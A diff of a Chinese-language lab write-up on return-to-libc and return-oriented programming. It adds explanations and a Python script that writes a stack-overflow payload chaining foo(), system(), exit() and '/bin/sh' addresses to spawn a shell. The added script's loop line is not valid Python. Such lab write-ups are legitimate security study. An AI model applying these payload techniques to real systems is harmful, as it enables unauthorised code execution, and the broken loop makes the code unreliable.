@@ -209,7 +209,7 @@ Frame Pointer value inside bof():  0xffffcde8
 
 之前我们手动将sh指向zsh，这个任务中我们需要通过`sudo ln -sf /bin/dash /bin/sh`将sh指向dash，之后攻破dash的防御机制
 
-## 一个失败的尝试法
+## 一个失败的尝试
 
 对栈帧进行覆盖，下面顺序是从高地址到低地址的方向：
 
@@ -256,7 +256,7 @@ with open("badfile", "wb") as f:
   f.write(content)
 ```
 
-攻击失败了，因为bof中strcpy函数遇到上面代码中B=36处的0会导致截断
+攻击失败了，因为bof中调用了strcpy函数，在复制过程中遇到上面代码中B=36处的0会导致截断，无法复制0后的/bin/bash，也即是system函数缺少参数
 
 ## 一个成功的尝试
 
@@ -282,7 +282,7 @@ void main()
 }
 ```
 
-- 使用gdb找到execv函数与exit函数的地址
+- 使用gdb找到execv函数与exit函数的地址，使用gdb的find命令可以查找字符串的地址
 - 组织payload字符串
 
 ```python
@@ -332,3 +332,40 @@ with open("badfile", "wb") as f:
 这里卡了很久，因为我在构建argv[]的时候，一直选择紧邻exit函数的地方，这样input的缓冲区可能会被buffer覆盖，感谢https://munian.life/2022/04/07/SeedLab2.0-Buffer-Overflow/这篇博客，提醒了我要在较远地址处构建缓冲区内容
 
 ![](https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image_2.png)
+
+# Task 5 (Optional): Return-Oriented Programming
+
+这个要比task4简单多了，先for循环填充10个foo函数的地址，然后按照类似task3的步骤填充system、exit、/bin/sh即可
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+D = 28
+foo_addr = 0x565562b0
+for(i in range(10))
+	content[D:D+4] = (foo_addr).to_bytes(4,byteorder='little')
+	D=D+4
+	
+Y = D
+system_addr = 0xf7e11420        # The address of system()
+content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')
+
+Z = Y+4
+exit_addr = 0xf7e03f80           # The address of exit()
+content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
+
+X = Z+4
+sh_addr = 0xffffd461            # The address of "/bin/sh"
+content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+  f.write(content)
+
+```
+
+![](https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/QQ%E5%9B%BE%E7%89%8720230123154648.png)
